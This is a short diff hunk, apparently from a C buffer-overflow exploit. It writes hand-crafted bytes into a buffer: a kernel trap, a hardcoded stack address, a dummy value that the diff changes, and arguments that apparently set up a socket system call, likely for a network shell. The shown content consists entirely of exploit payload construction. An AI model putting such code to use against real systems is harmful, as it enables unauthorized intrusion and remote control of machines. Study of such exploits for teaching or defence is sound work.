@@ -84,7 +84,7 @@ int main(void)
   // trap into the kernel
   strcpy(bufr + 223, trap);  // location is 0xbfbf67fc
   // dummy val
-  strcpy(bufr + 227, "\xb4\x7a\xa7\xbb");
+  strcpy(bufr + 227, "\x68\x8b\xaa\xbb");
   // socket arg 1 -> 2
   strcpy(bufr + 231, "\x01\x01\x01\x01");
   // socket arg 2 -> 1
